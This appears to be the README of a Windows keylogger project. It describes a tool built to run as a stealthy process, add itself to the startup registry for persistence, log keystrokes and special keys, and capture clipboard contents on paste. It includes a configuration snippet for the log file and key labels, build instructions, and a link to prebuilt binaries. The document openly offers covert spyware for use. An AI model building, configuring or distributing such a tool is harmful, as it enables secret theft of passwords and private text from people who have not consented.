## Features
- Stealthy process
- Automically added to startup registry
- Keyboard locale support
- Special characters and numeric keypad
- Clipboard parsing on `Ctrl + V`

## Configuration
You may configure the name of the logging file as well as what should be logged for each [virtual-key code](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731.aspx) by changing the `configuration.h` file.
```cpp
constexpr const WCHAR* out_file{ L"different_name.txt" };

const std::unordered_map<DWORD, const WCHAR*> key_codes
{
    { VK_DOWN, L"[DOWN ARROW]" },
    { VK_RETURN, L"\n" },
    { VK_ESCAPE, L"[ESCAPE]" },
    { VK_BACK, L"[BACKSPACE]" }
};
```

## Build
Visual Studio 2017 is required to load the solution. However, the project may be compiled by any Windows C++11 compiler. The required Windows libraries are `User32.lib` and `Advapi32.lib`. If you do not wish to build the project yourself, you may use the prebuilt binaries available here: https://github.com/vim2meta/Keylogger/releases.

## Contributing
All contributions are welcome. If you are going to submit a pull request, please follow the style of the project and aim for clear and concise code.
